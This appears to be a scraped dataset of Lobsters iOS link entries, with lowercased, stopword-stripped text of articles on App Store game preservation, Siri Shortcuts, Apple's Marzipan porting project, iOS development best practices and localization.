game properly contextualize studio recent release street fighter anniversary collection collection classic title includes archival document capcom creator series music file lot historical detail franchise digital eclipse first work mega man legacy collection pioneered approach addition six original mega man game compilation featured stage remixes new challenge mode online leaderboards rewind option reverse gameplay plus museum mode rare concept art original promotional material sound like videogame version criterion collection film exactly digital eclipse trying achieve upcoming snk anniversary collection set released november company even found way emulate peculiar rotary joystick snk arcade day nintendo switch dualanalog stick another example digital eclipse mantra game playable code also snapshot time place example kind classic promotional material included digital eclipse conversion old game besides cultural aspect digital eclipse effort preserve artistic intent also making game palatable modern audience technical standpoint fascinating model worth keeping mind future io game preservation digital eclipse head restoration frank cifaldi noted interview company keep porting old game new system often need start process whenever new console architecture come around cost time money typically result cheap port faithful original game nothing explain history overcome problem digital eclipse developed custom engine aptly named eclipse engine easily ported multiple platform act middleground format old game long game run eclipse engine run platform eclipse supported playstation pc xbox switch game converted eclipse format run anywhere eclipse digital eclipse plainly state website video interesting consider digital eclipse approach may become template others follow decade videogame historian look back early iphone game wonder emulated contextualized may seem like odd prospect iphone even game important celebrated industry mega man street fighter keep mind kid playing io game today grow look back fondly earliest videogame memory like many u reminisce old snes genesis game boy console mobile game nostalgia sound like absurd scenario history indication happen involve entire generation young player whose experience videogames growing iphone ipad collecting historical material app store first decade game today world would youtube video tweet blog review combining middleground engine bring back game multiple platform could intriguing bet preserve medium origin history digital eclipse however company thinking deeply game preservation giving u glimpse could done preserve app store gaming history going forward gdc talk jason scott archivist internet archive made case game artifact historical value developer need start preserving today internet archive along preserving game software work preserve book film website magazine medium putting everything open web others see use one internet archive fundamental belief scott said presentation access drive preservation idea behind internet arcade nonprofit free emulator classic game feature title played anyone browser tab whether joust run defender evergreen paperboy remember coinoperated game chance find freely available web emulated internet arcade classic game paperboy available free internet arcade hard imagine apple teaming internet archive year celebrate app store anniversary mobile game emulated browser tab idea streaming game server without run locally device crazy realize handful company already today sony playstation instance let player stream library game monthly fee local downloads crossplatform support pc even google rumored entering space cloud gaming product allow anyone play consolequality game browser apple ever adopts streaming future could potentially offer way play classic iphone game without complication running old version io owning device app store go cleanup event legacy title next year point seems inevitable current game become legacy software apple platform another idea apple could borrow videogame industry backwards compatibility concept simple theory trickier pull practice history videogame console offered compatibility mode play title previous console current one playstation instance offered backwards compatibility playstation game wii gamecube wii u wii nintendo game boy title could played game boy advance turn compatible d compatible later get idea nintendo sometimes taken backwards compatibility extreme pictured game boy advance player gamecube personally embedding emulator older generation latest system console maker often relied backwards compatibility artificially inflate console launch catalogue cater existing user base spread goodwill among customer follow videogame news may familiar fan reaction microsoft announcement xbox one backwards compatibility xbox title kicker though apple offering backwards compatibility mode io year sort ipad launched apple decided let new device run existing iphone apps box virtualized environment time idea ipad nascent platform user favorite app available ipad yet could install iphone version run big screen eight year later feature somehow still available actually improved io support iphone resolution compatibility mode another major shift apple platform occurs within next two decade unreasonable envision compatibility layer ensures io apps game continue run natively usable new architecture however count apple going far enhancing old game resolution like microsoft xbox game running xbox one x hardware apple mobile device grow something radically new expect apple take backwards compatibility emulation layer preserve million io apps game new system follow idea access drive preservation consider lack app store exclusivity popular game might also turn good thing everyone year recent year particularly thanks availability crossplatform game engine unity seen highprofile title launch io first later expand console pc room popular puzzle game fireproof game launched io ported window monument valley hidden folk two awardwinning io game monument valley introduced exclusive wwdc also found steam google play amazon bethesda fallout shelter freetoplay simulation spinoff fallout series launched io june ported android window xbox one playstation nintendo switch point unless technically impossible development studio adapt io game platform crossplatform engine availability digital game store make dramatically easy extract revenue game bringing console pc market game digital store preservation guarantee increase chance game survive form next decade perhaps may even receive printed copy treatment company limited run game specializes making physical version game originally digitalonly videogame industry far solved preservation dilemma ongoing debate requires game developer take preemptive measure ensure creation arguably digital work art preserved enjoyed decade come like industry needed grow quickly match fastpaced technological progress past year game industry fair share misstep valuable lesson mobile developer thinking future game today least videogame company thinking preserving history make sure blunder satellaview lost game exception rule even though constant challenge topic digital conservation emulation backwards compatibility discussed videogame industry taken seriously ever said app store already lost hundred game inexorable marching time expiring contract first decade biggest problem facing app store preservation today lack kind emulation old title longer supported modern hardware game confined physical storage old device updated latest o moma paul galloway told borndigital work number hardware software dependency must met order work perspective problem faced apps mobile os common many kind digital work important difference large community dedicated project like mame emulation tool galloway added yet equivalent established game designed mobile os medium conservation team thus tasked figuring bridge gap first ten year app store littered story game played loved million eventually disappear technical legal reason scroll back app store purchased history come across familiar name tap tap revenge one iphone launch title rolando series classic beloved flight control io port original bioshock doublefine dropchord many many others toki torus minigore first real racing astronut super stickman golf lostwinds browsing old list show u far iphone app store advanced span year also sad reminder longer play sizable portion game pioneered iphone gaming moment time nobody knew design multitouch control million people early iphone game represent first cherished videogame memory many game lost history looking ahead app store issue preserving existing apps game become increasingly pressing apple thirdparty developer outlined story videogame industry good starting point debating software preservation several parallel app store including new game service trend essentially apps trying subscription game developer thinking digital conservation longer besides cultural initiative moma assuming company digital eclipse limited run continue suitable game apps backwards compatibility emulation seem like best idea app store could steal videogame industry next couple decade wish apple would go route emulation zach gage told interview appstories level little bit comfortable older game gone necessarily want people going buying feel like really representing level polish kind output gage added interesting point raise question whether app original creator would even want creation preserved forever also feel like real value term able see history someone work make sad early game available played anymore concluded gage also noted unlike first iphone game trying make newer title protected term easily recompiled released platform even mentioned perhaps future someone could use one many io piracy website people download illegal cracked copy apps game free repository emulator old title given site effectively public archive older io app binary crazy sound wrong emulation perfect though developer digital eclipse noted year ago emulation put game historical context company passable job adapting old title latest system emulation good basic place start preserve work basic reliable way moma paul galloway told work lack original hardware would adversely affect understanding game added mentioning duck hunt ne example something certainly lost without hardware degree really matter varies greatly work work galloway said may get bad rap among care art craft highfidelity preservation emulation layer old apps could simplest cheapest practical solution apple preserve app store catalogue going forward although apps game may stop working eventually least apple allow user redownload open apps even take advantage latest greatest feature io company decision cut support hundred game could still enjoyed customer last year io update perplexing raise doubt might happen next major platform transition occurs would really best interest customer keep ridding app store old apps game could still continue work apple offered basic backwards compatibility feature ultimately entire discussion go back fundamental question even matter preserve old apps posterity software preservation sprawling complex subject impossible sum one short answer wanted round special app store anniversary coverage analyzing different side software preservation think one right way handle conservation old apps game sympathize digital eclipse meticulous approach also applaud moma effort internet archive emulation perplexed apple unwillingness offer emulation tool especially old io game understand size app store fast evolution io problem nintendo others account year ago many way preservation mobile software still uncharted territory believe however asking whether apps game download phone day reflection society certain point time could worth saving future personally think many today ever apps informing shaping culture communication entertainment news mobile game increasingly shedding negative connotation mobile discussed equal footing console counterpart yet despite capturing cultural zeitgeist center digital life apps still largely ephemeral medium deeply tied everchanging technology company seemingly care past next way want believe next decade apple thirdparty developer learn appreciate history app store treat back catalogue something nuisance expiration date sometimes useful perhaps even fun marvel far come looking back began let check back year
192,Lobsters,ios,Apple iOS,Apple wrote code to appease the Chinese government... it was buggy,https://objective-see.com/blog/blog_0x34.html,apple wrote code appease chinese government buggy,,remote io bug apple wrote code appease chinese government buggy enjoy blog post support writing tool patreon
193,Lobsters,ios,Apple iOS,Shortcuts: A New Vision for Siri and iOS Automation,https://www.macstories.net/stories/shortcuts-a-new-vision-for-siri-and-ios-automation/,shortcut new vision siri io automation,future workflow article last year acquisition announcement wwdc sirikit intent app shortcut suggestion shortcut donated apps generated ondevice nsuseractivity offer search result spotlight accomplish around since io slightly improved last year domainspecific approach new kind automation add siri include custom shortcut shortcut app full compatibility existing workflow workflowkit framework imagined last year shortcut detail magic variable scripting action introduced workflow shortcut action extension share sheet gallery stay question remain public sharing homekit integration new show result action siri output support passing input custom shortcut siri native app shortcut support custom input output customizable field url scheme action thirdparty apps remain available bear thing ulysses shortcut widget limited user interaction widget running custom shortcut siri audioonly context new play medium intent inplaymedia intent future workflow siri recurring theme year unlike google assistant,future workflow article last year published soon news apple acquisition outlined probable outcome app optimistic one best timeline speak envisioned updated workflow app native io automation layer deeply integrated system builtin framework studying apple announcement wwdc talking developer conference based detail personally hearing shortcut wwdc appears brightest scenario indeed coming true matter month surface shortcut app look like fullblown workflow replacement heavy user app wishfully imagining past year going shortcut app alone shortcut feature fact reveals fascinating twofold strategy one hand apple hope accelerate thirdparty siri integration leveraging existing apis well enabling creation custom sirikit intent company advancing new vision automation lens siri proactive assistance everyone power user reap benefit still early comment longterm impact shortcut least attempt understand potential new technology article try explain difference siri shortcut shortcut app well answering common question much shortcut borrows original workflow app let dig app shortcut suggestion important difference shortcut shortcut app system functionality shortcut convenient way reopen interact key feature app user previously seen completed instance io may see shortcut ordering coffee way work playing podcast playlist thirdparty app driving back home app shortcut workflow equivalent point interest app easily find apple parlance shortcut donated apps system user performs action app io suggests shortcut spotlight search result appear tappable item featuring app icon labeled action lock screen notificationlike bubble watchos see suggested shortcut siri watch face shortcut suggestion generated ondevice taking account contextual trigger time day day week user location detected motion walking driving apple developing refining socalled proactive technology year shortcut project mark company first foray deeplinked app action react user pattern environmental trigger two type app shortcut first kind basic shortcut open specific piece content section app simpler shortcut based nsuseractivity api apple first introduced io enable thirdparty apps hand activity device later expanded io offer search result spotlight api minimal tweak developer side used io provide user shortcut launch apps specific screen activity expect developer adoption shortcut based nsuseractivity massive io launch later year especially apps require execution task inline within sirispotlightlock screen nsuseractivity enough according apple nsuseractivity enables basic integration apps sirikit intent provide best experience user want accomplish shortcut new api either way surfaced throughout system sirikit intent around since io way developer integrate apps natively siri voice experience perform action inline within assistant apple launched sirikit domainbased api designed specific kind apps slightly improved last year addition visual code list notetaking apps becoming clear apple narrow domainspecific approach scale thousand apps easily categorized company turning sirikit head io developer create custom intent based builtin semantic template furthermore existing sirikit intent break siri ui also work shortcut place spotlight lock screen even siri watch face apple approach surprising io apps ability perform task custom interface response outside main app environment currently possible sirikit intent expand functionality type proactive assistance shortcut essential repeatable feature app become action executed anywhere system without launching full app idea frequent usage user routine separate intentbased shortcut traditional sirikit voice interaction example io may learn way back home work thursday like order pizza delivered pm average workday around pm open thing office project repeatable action developer turn shortcut custom interface using underlying intent technology first launched io developer planning integrate sirikit io consider whether user may want execute action apps elsewhere system shied away integrating sirikit far probably look custom intent new feature allows app offer custom interface custom response used intent invoked via siri shortcut create custom intent developer choose building block include verb order template action essentially define siri talk task executing excited prospect app becoming eligible siri integration going forward expect apple continue expanding custom intent technology may open siri hundred thousand new app integration even though opposite may seem true shortcut feature described far constitute form automation arguably suggested shortcut system automation action trigger specific function conveniently presented best available time location anticipate user need oldschool power user may disagree broadly consider apple proactive technology whether surfacing calendar event email message ordering coffee driving work new kind automation time developer adoption tell apple bet successful conceptually speaking see suggested shortcut effortless almost invisible way get user accustomed idea action automatically surfaced o line system user automation get blurry start considering second layer apple shortcut initiative ability user create custom phrase launch shortcut add siri available setting siri search io feature option user define phrase launching specific shortcut via voice done speaking custom phrase siri recording ui transcribes command creates shortcut invoked time setting app automatically suggests recently used app shortcut well shortcut previously donated apps recording custom shortcut phrase launching phrase via siri require active internet connection given custom phrase userconfigured shortcut appear shortcut section setting detail worth noting adding custom shortcut phrase siri apps thirdparty developer embed message button design bring siri ui record shortcut phrase mean start seeing apps populate important screen action suggestion button record shortcut phrase moreover siri recording ui developer include phrase suggestion user decide want record importantly user always create personalized shortcut phrase direct interaction apps automatically fill shortcut page setting shortcut custom phrase user associate custom phrase shortcut first think see custom shortcut phrase next big step making siri personal assistant unique user would happen actual assistant shortcut phrase allow user form language time creating personalized set instruction assistant interpret act upon equivalent jargon group friend applied siri app action potential accessibility perk tremendous apple enables everyone create custom siri phrase however long short want remove need find action nested apps multiple level deep navigation stack believe apple workflow shortcut team incredibly smart reframing concept user automation around siri voice think custom phrase dissimilar keyboard shortcut however spoken phrase easier remember feel like dark magic regular user never bothered automation natively supported across entire spectrum apple product iphones airpods homepods watch strongly believe personalized phrase first step towards changing fundamental siri experience going evolve personal command log one siri million siris uniquely tailored user customized furthermore custom phrase reveal third final layer apple automation siri personalization strategy brand new shortcut app custom shortcut shortcut app shortcut app announced wwdc last week new version workflow app part io instead available app store conversation last week appears apple goal offer full compatibility existing workflow previously created workflow app understanding apple much aware fact sizable portion proprosumer community relies workflow enhance io experience key way want change relationship worse little nothing break transition shortcut app fact optimistic prospect retaining action original workflow plus new one created specifically shortcut first glance shortcut look like cleaner intuitive version workflow designed modern io design language app let create workflow referred custom shortcut editor like workflow app support drag drop move action library organized content type shortcut editor shortcut app apple removed swipe gesture navigate action library editor favor bottom panel reminiscent apple map stock io search field always available bottom editor tap able view action shortcut offer abundant design refinement new action panel aside editor core structure look like workflow despite close resemblance shortcut redesigned version workflow also glorified utility people want geek io device third layer suggested shortcut custom phrase custom shortcut versatile tool every io user want deeply personalize siri automate sequence action yes even augment productivity shortcut app aim powerful blend workflow app shortcut siri rolled one new take personal assistant io automation bold idea keep made workflow unique also opening broader user base deeper system integration key element consider first app shortcut aforementioned action donated developer nsuseractivity sirikit intent part custom shortcut created shortcut app shortcut either appear siri suggestion apps action library inclusion action shortcut app big deal first time user create chain action execute native thirdparty app command without launching apps url scheme whether want launch activity app perform action native action require write code talk web api case intentbased action run inline within shortcut app way first step toward workflowkit framework imagined last year solution apps supported automation environment without limitation security concern url scheme foresee apple would reuse sirikit think new integration obviate need customizable url scheme action yet move right direction perhaps impressively seems upon assembling custom shortcut user able choose display native thirdparty app action new show run toggle guess say setting applies shortcut run shortcut app well execution multiple step siri brings second notable trait shortcut app custom phrase like shortcut provided apps system assigned custom siri invocation phrase custom shortcut shortcut app assigned phrase quickly trigger siri tie another key functionality custom shortcut whenever possible siri io try run multiple step comprise custom shortcut inline without launching shortcut app simply moving sequence action confirming result user demonstrated apple kimberly beverett last week keynote custom shortcut siri able send imessage contact set homekit scene play audio thirdparty radio app open direction map single request ran contextually inside siri demo showcased two powerful aspect shortcut integration siri background execution ability skip confirmation step series automated action like traditional workflow siri completed multiple action row displayed summary message launched app end even imagine advanced custom shortcut could build mixing background execution web apis native app shortcut siri sequence action execution multiple background task inside siri feel like final piece workflow acquisition puzzle consider layer covered app shortcut custom phrase custom shortcut clear apple want transform siri assistant capable handling variety apprelated request importantly bundle sequential request routinely requested user shortcut feature seen far running whole sequence step siri one curious shortcut detail assembled collection detail shortcut shortcut app able put together rewatching wwdc video well lot interesting conversation last week magic variable scripting action two workflow advanced functionality continue supported shortcut likely play essential role creation complex chain action magic variable introduced workflow enable action continuously create variable behind scene letting user dynamically convert type using content graph engine magic variable unique workflow dramatically changed advanced user chain action together judging apple screenshots shortcut app magic variable supported custom shortcut user also able include part response read aloud siri also glad see inclusion scripting category action shortcut currently scripting section workflow feature option conditional block repeat loop getting data type setting file name even fetching device detail like battery network information sign pointing shortcut retaining functionality shortcut action extension share sheet one workflow powerful flexible system integration action extension let user run workflow contextual app item sharing hear apple plan keep action extension shortcut app someone regularly us dozen workflow activated extension apps like safari ulysses photo look forward adapting shortcut extension gallery stay question remain public sharing confirmed apple shortcut app builtin gallery user browse download hundred premade custom shortcut different task shortcut organized category curated apple regular basis gallery new workflow app unclear public sharing usercreated custom shortcut part shortly apple acquired workflow company removed ability user share workflow directly gallery public user profile seems like shortcut follow footstep gallery limited custom shortcut created promoted apple confident shortcut app continue offer way user share custom shortcut believe sharing tied gallery least initially said would love see user sharing return gallery future update curated marketplace custom shortcut created community vetted apple see tremendous potential letting io community natively extend siri io apps homekit integration shortcut app support homekit keynote apple demonstrated custom shortcut could set thermostat specific temperature toggle fan actually seen homekit action set shortcut yet though clear homekit action let configure individual characteristic accessory granular option surprised simplicity sake first version shortcut support triggering existing homekit scene new show result action siri output judging slide shown wwdc action let user craft custom siri response shortcut app show result action filled magic variable arbitrary plain text custom shortcut run via siri assistant speak text content action already imagine possibility action open ability end different siri response depending result conditional block shortcut curious know happens show result custom shortcut run outside siri ui though support passing input custom shortcut siri understanding triggering custom shortcut siri allow pas along message input text instance custom shortcut sends input text ulysses associated ulysses append phrase able say ulysses append buy nintendo switch siri expect buy nintendo switch part sent ulysses app able gather far siri io currently support ability pas input message custom shortcut activated user phrase unlikely gain functionality first version io mean siri launcher custom shortcut actual interface pas user command specific parameter runtime lot complexity involved assume one next big feature pipeline shortcut native app shortcut support custom input output customizable field similar note native app shortcut based sirikit intent execute within shortcut app receive custom input previous action also set magic variable custom output customizable parameter shown apple screenshots shortcut app native app action disconnected every step custom shortcut likely going limit flexibility advanced user url scheme action thirdparty apps remain available addition manually launching url scheme open url open xcallbackurl action workflow long offered selection builtin thirdparty app action based url scheme abstract complexity visual module example bear thing ulysses come native workflow action pas along custom parameter launching respective apps talking several developer wwdc sound like good chance thirdparty app action powered url scheme remain shortcut app well personally think continue solid workarounds sirikit intent powerful customizable enough offer functionality url scheme action ideally future version shortcut action replaced visual sirikit intent customized multiple variable parameter user seems like traditional url scheme action still allow deeper customization control native app shortcut shortcut widget limited user interaction shown apple website shortcut app keep widget let workflow user run workflow outside app widget one workflow peculiar feature support remote execution workflow basic interactivity kick back main app come across action completed widget entering text keyboard editing image idea running sequence action different constrained environment brings running custom shortcut siri audioonly context shortcut widget apple said custom shortcut offered io watchos homepod even carplay infer ability shortcut run different context expanding audio watch face limited ui like widget assume mean custom shortcut completely execute within siri whether homepod watch unless action requires manual user input case siri would probably ask continue running shortcut iphone case think explanation mostly accurate imagine custom shortcut embed action choose list ask input require jumping siri shortcut app would completely okay first version generally speaking though love siri give multiple option choose list allow enter input via voice interact shortcut executing audioonly context new play medium intent finally speaking audio sirikit io support new inplaymedia intent name suggests allows assistant play audio video content thirdparty apps intent launch apps background radio station demo keynote support playing audio homepod well suggestion lock screen term app adoption shortcut integration intent make possible like spotify overcast offer user way play favorite content via siri like apple music podcasts overcast thirdparty podcast apps could instance offer siri shortcut button various place uis let user record phrase play overcast queue let listen connected playback would kick immediately background play device speaker homepod device interpretation correct combination shortcut new medium intent may alleviate lot annoyance typically involved using siri thirdparty medium service future workflow siri io apple providing user path simple shortcut custom automation revolve around guiding principle letting user choose want siri get thing done behalf progressive disclosure automation happening system shortcut shortcut app whether never dabbled app shortcut workflow expert io want help spend le time using phone recurring theme year let shortcut work shortcut going feature developer adopt summer talk wwdc based conversation developer excited optimistic embedding sirikit shortcut within apps particular custom phrase custom sirikit intent seem attractive proposition developer want let user conveniently open interact apps shortcut custom phrase feel like future siri apps supported every permutation siri importantly let user develop language access commonly used action instead forcing remember syntax made app name verb shortcut phrase custom intent feel like app usercentric response alexa skill apple uniquely positioned build shortcut way sell idea lightweight automation regular user shortcut app shaping automation powerhouse hoping see following workflow acquisition seen far shortcut team able build cohesive narrative around basic shortcut custom one going far beyond workflow could achieved independent app optimistic heavy workflow user disappointed shortcut even feature parity workflow though see integration custom shortcut siri next frontier making automation accessible people believe going push automation forward something scripting old preconception giving user tool create automation drag drop easily trigger voice remarkably powerful idea turn siri truly personal programmable assistant capable performing entire series action one request think ever seen anything even remotely similar apple demo shortcut app siri integration platform people however may argue real support multiple command siri still create custom shortcut favorite action manually set siri maybe shortcut app way apple circumvent fact siri unlike google assistant capable handling multiple question sentence yet ultimately however go back whether see beauty potential user automation custom shortcut even speak entire sentence containing multiple request every time want execute tell siri short custom phrase fire multiple step perspective exactly automation making computer useful accessible faster save time focus something else custom shortcut shortcut app show vision still much alive inside apple evolving time
194,Lobsters,ios,Apple iOS,The future of the Mac comes from iOS apps,https://www.theverge.com/2018/6/7/17438450/apple-marzipan-mac-ios-apps-port-mojave-appkit-uikit-future-platform-software,future mac come io apps,developer port io application mac apple developer guilherme rambo detailed history good place start pointed john gruber live side side pointed steve troughtonsmith commented twitter currently pretty sluggish interview extremely io interface webappstyle electron application developer david barnard,apple made big splash wwdc year announced would letting developer port io application mac sometime next year apple already started process bringing io version home stock news voice memo apps macos mojave project rumored codenamed marzipan still early stage apple even planning offering developer already fair amount confusion outcry apple whether see death traditional mac app know exactly new kind apps work whether feel like traditional native mac apps even whether fair call apps port actually going understand apple first need understand even discussion first place apple want make easier mobile developer get something like mobile apps mac well one thing clear way developer making io apps mac apps right mac app ecosystem necessarily trouble compared happening iphone past year definitely feel little stale making easier move io apps mac would certainly help apple developer guilherme rambo wrote piece year back right developer often forced choose developing supporting io app mac app world far io user mac often miss great software getting small mobilefirst apps desktop turn wildly convenient used android chromebook really great lightweight app lightweight task like scrolling instagram firing todo list window trying something similar framework limited increasing success android apps chromeos beta although still need add thing like windowing support trick get mobile apps ported whatever word really want use mobile desktop apple solution many way interesting take problem seen yet let start difference mac io apps first glance seem pretty similar use base code language like objectivec apple swift plenty underlying apis difference seems blindingly obvious boil user interface mac apps work keyboard mouse io apps work touchscreen simply moving iphone apps mac way similar google first beta android chromeos experience apple want apple solution give developer tool need make io apps get maclike user interface many mac application based software framework called appkit provides user interface element make mac app window menu button scrollers text field along highlevel softwareside thing computer need actually display application appkit date back descended original nextstep application kit detailed history good place start premarzipan macos apps appkitbased io apps uikit apple developed io created entirely new software framework displaying application called uikit designed smaller screen limited touch control io device offer mean huge chunk io apps displayed device way color shown pointed john gruber us different fundamental code framework mac apps adding complexity appkit designed mouse keyboard input whereas uikit designed touch marzipan apple looking bring uikit framework mac meaning developer theory able bring version application run mac without completely rewrite scratch appkit user interface additionally adding uikit macos native framework ported apps run natively instead simulator emulator note apple adding uikit replacing traditional appkit live side side look chart already precedence sort porting apple ecosystem ipad apps tvos apps apple tv already work similar basis built uikit share code iphone version developer easily port one platform another platform still interface consideration design control like expect ipad application simply giant iphone app apple tv app work like ipad app remote control marzipan application ported mac theory would user interface design layout best suited desktop theory anyway practice tried apple new apps macos mojave apps feel lot like ipad apps tap course something layout control feel much like ipad resize window unlike android apps chromeos redrawing window content sometimes little slow classic mac feel apps app apparent home app controlling smart home device look lot like straight port big giant button everything look like tap tap apple fundamentally belief touchscreen laptop bad idea almost every year asked apple case answer really changed apple belief touchscreen laptop uncomfortable use user research show even customer touchscreen barely use come away thinking end result going bunch apps look feel like ipad apps mac apps apple released first cut marzipan least year away available developer apple say longterm project course next year expect apple develop framework apis make apps feel little native mac pointed steve troughtonsmith poking around rudimentary marzipan support mojave developer beta suggests apple already starting adding interface element like classic mac app sidebar uikit let developer make io apps feel home macos plus already seen bunch untapped speak potential apps started diving mac menubar apps classic mac file edit view menu option keyboard shortcut many expect would quite simple add marzipan still early stage right marzipan still early stage apple access unless good digging apple filesystems four apps apple ported still sure look lot like io apps run mac might best start example developer looking follow suit goal good native mac experience tapbots developer paul haddid commented twitter uikit mac feel like running io app resizable simulator next gen mac app troughtonsmith early experiment seem agree noting resizing uikit window currently pretty sluggish noted apple senior vice president software engineering craig federighi interview wired apple already planning help developer way process tool roll developer next year able designate xcode want make variant app run macos automatically replace part app interact example long press io morph twofinger right click mac theory could developer simply bare amount effort make windowed version iphone app marzipan sure likely loweffort attempt missing point supposed offer goal replace native mac application io version idea developer able make bespoke mac version application otherwise ever made macos expand developer offer mac without extra lift writing new separate app scratch reason ported io apps necessarily indicate apple making touchscreen imac macbook pro way tvos running ported uikit io apps mean apple making ipad without touchscreen work tv remote ideally form still mac apps mouse keyboard focus mac app entail mean apple either predicting apple given day tough still room traditional mac apps developer choose support said ported apps recreation appkit app either uikit apps still uikit apps mean least right based apple apps look always going hereditary dna like extremely io interface apple ported home app meant apple tweaking next year achieve sort middle ground still presumably always room traditional mac apps developer choose support another part uikit apps might serve macos replacing webappstyle electron application sprung recent year like slack simplenote native uikitbased port io counterpart lot popular apps mac right electron apps could potentially threat mac everybody get used using modified web apps stop switching chromebook heaven forbid window much developer david barnard argues uikitbased apps desktop could offer convenient appbased experience phone computer easily especially service better apps website like bank weather apps point marzipan apps could probably offer better experience electron apps look slack ramhogging goliath mac run sweetly smoothly ipad lot depend apple make available developer right word tool start rolling third party start tinkering beyond next year much le consumer release still plenty question like whether uikit ported apps offered universal software like io ipad watchos tvos apps currently bundled whether developer able offer uikit appkit version apps mac app store still plenty question developer able take advantage potential apple seems offering big theoretical could mean fresh wave new native apps mac hugely change interact computer much way apps forever changed mobile landscape oh two final piece completely unjustified speculation fun first one knock ipad pro enough pro apps level available mac ipad pro powerful processor many capability builtin io operating system issue seems failure imagination failure operating system support maybe developer get habit making powerful apps mac new tool might go ahead make available ipad second io apps run arm processor mac run intel processor far tell real hassle getting marzipan apps going intel chip thinking maybe someday making armbased mac might want bunch apps know would run well
195,Lobsters,ios,Apple iOS,Scaling a Swift SDK - Learnings on building a set of Swift Libraries,https://blog.bitrise.io/scaling-a-swift-sdk-learnings-on-building-a-set-of-swift-libraries-meetup-recording,scaling swift sdk learning building set swift library,scaling swift sdk learning building set swift library meetup recording,scaling swift sdk learning building set swift library meetup recording
196,Lobsters,ios,Apple iOS,New Network.framework on macOS/iOS,https://developer.apple.com/documentation/network,new networkframework macosios,page requires javascript,page requires javascriptplease turn javascript browser refresh page view content
197,Lobsters,ios,Apple iOS,WWDC18,https://developer.apple.com/wwdc/,,full stream ahead watch video,full stream ahead join u wwdc like never jampacked allonline experience coming apple park watch video
198,Lobsters,ios,Apple iOS,YubiKey comes to the iPhone with Mobile SDK for iOS and LastPass support,https://www.yubico.com/2018/05/yubikey-comes-to-iphone-with-mobile-sdk-for-ios-and-lastpass-support/,yubikey come iphone mobile sdk io lastpass support,cookie notice close,use cooky ensure get best experience site present relevant content advertising browsing site without restricting use cooky consent third party use cooky set cookie notice close yubico privacy cooky policy scroll top
199,Lobsters,ios,Apple iOS,A collection of best practices for iOS app development processes,https://ios-factor.com/,collection best practice io app development process,twelvefactor app framework background iosfactor github io factor explicitly declare isolate dependency configuration code ship default config allow ota update keep development testing production similar possible automate deployment release machine keep io app smart enough operate without backend possible nt assume every user update latest version automate app build version number consistency reverting build cause issue follow apple guideline storing data,iosfactor inspired famous twelvefactor app framework methodology write highquality web service iosfactor us structure similar principle rewritten applied io app development process background past year io development process shifted drastically supporting single device wide range available iospowered iphones ipads various platform like tvos watchos manually including git submodules using dependency manager io apps mostly running locally ondevice io apps heavily relying backend service io app review time week le day installing app phone using itunes distributing apps official testflight channel uploading screenshots per language itunes connect per language well app preview plain objectivecc apps mix language including javascript slow release whenever something ready shipping every single week full release ab testing slow rollouts automatic regression detection iosfactor iosfactor experimental project started may aim provide collection best practice building highend io application topic covered factor describes ideal state certain category io app development process could look like due certain limitation like xcode running macos requirement fulfilled project aim define goal well best current approach solve challenge facing iosfactor biggerpicture io app development process architecture decision cover language specific challenge living project maintained io development community find full source github update existing page add new factor io factor explicitly declare isolate dependency configuration code ship default config allow ota update keep development testing production similar possible automate deployment release machine keep io app smart enough operate without backend possible nt assume every user update latest version automate app build version number consistency reverting build cause issue follow apple guideline storing data
200,Lobsters,ios,Apple iOS,Monal iOS 3 Released - Push Support,https://monal.im/blog/monal-ios-3-released/,monal io released push support,,version third major version release since major change way app work look hope change made better likely quick update address issue raised fundamentally way monal work changed use push receive message option vastly improves message reliability server need push support enabled monal server still receive message know wake device new message push available multitasking short address change io recent version way go back old behavior unfortunately apple engineer said current approach much better testing reliability comparable imessage additional improvement new layout ui trying highlight element used iphone x support conversation synchronization delivery confirmation improved multi user chat server capability viewer side side multi tasking ipads view image conversation improvement stability reliability
202,Lobsters,ios,Apple iOS,How to set up a CI for multiple iOS and tvOS Apps using Fastlane and Bitrise,https://blog.bitrise.io/how-to-set-up-a-ci-for-multiple-ios-and-tvos-apps-using-fastlane-and-bitrise,set ci multiple io tvos apps using fastlane bitrise,set ci multiple io tvos apps using fastlane bitrise,set ci multiple io tvos apps using fastlane bitrise
203,Lobsters,ios,Apple iOS,Baddaboo/ClassicKit: A collection of classic-style UI components for iOS,https://github.com/Baddaboo/ClassicKit,baddabooclassickit collection classicstyle ui component io,join github today sign file permalink introduction update usage note faq q ben galassi q project made apple device based microsoft design q nt ui rendering storyboard q need yyimage disclaimer license topic resource reload reload,collection classicstyle ui component io dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time collection classicstyle ui component uikit influenced window introduction little exploration applying design principle modern platform primitive component asset design metric part taken actual installation window pixelaccurate rendition original design update added simple blue screen death simply shake device vigorously usage browser example run outofthebox able include file component project component intended used like uikit counterpart example ckbutton respond gesture event uibutton would ibdesignable component mean lay entire app component interface builder xcode render note faq project much workinprogress although designed modularity robustness mind guarantee reliability q project born wholesome sarcasm millennial joke ben galassi check work q project made apple device based microsoft design q nt ui rendering storyboard interface builder finicky rendering typically fails underlying code error constraint satisfied even fix issue may clear cache restart xcode q need yyimage nt yyimage used ckimageview animate throbber animation browser example remove reference ckimageviewswift eventually dependency removed please let know question comment also love chat design tech nostalgia disclaimer claim ownership asset logo used project window internet explorer registered trademark microsoft inc license mit collection classicstyle ui component io topic resource perform action time signed another tab window reload refresh session signed another tab window reload refresh session
204,Lobsters,ios,Apple iOS,Quick Guide: iOS Internationalization (i18n) and Localization (l10n),https://phraseapp.com/blog/posts/ios-internationalization-localization/,quick guide io internationalization localization,apple preliminary decide region locale want target check guide internationalization io check guide localization io translator dependent upon service support xliff file translation management solution getting started guide io,apple mobile operating system io experienced extraordinary global growth last year much according apple country io app store available language io device support internationalization process making app adaptable different language culture localization io hand process translating app multiple different language particular locale note oftentimes developer reality different interconnected concept therefore divided tutorialbased article two subsection internationalization io localization io know internationalization localization often abbreviated respectively represents number character inbetween n internationalization whereas represents number character inbetween l n localization fancy stuff going deep subsection mentionedabove let u first look required step preliminary section familiarizing required step perform io application tool require following tool xcode latest version right using xcode programming language io going programming using following language decision internationalization localization practically need first decide region locale want target language region preliminary step crucial target audience article going use english base language french chinese traditional german language localization add many language want app depending requirement target audience step adding language would exactly term know region country referred locale especially deal internationalization localization wherever find word locale simply mean certain country region bookish term discussed basic time dive subsection mentioned manager global success learn find best manager follow best practice making business global success check guide internationalization io mentioned process making app adaptable different locale io developer perspective process making string externally storyboard code furthermore order set date number etc according respective locale use different buildin class example use formatting class format date according region number according preferred language going use simple setup get used internationalization process recommendation always internationalization localization step completing design coding part application xcode save time adding string 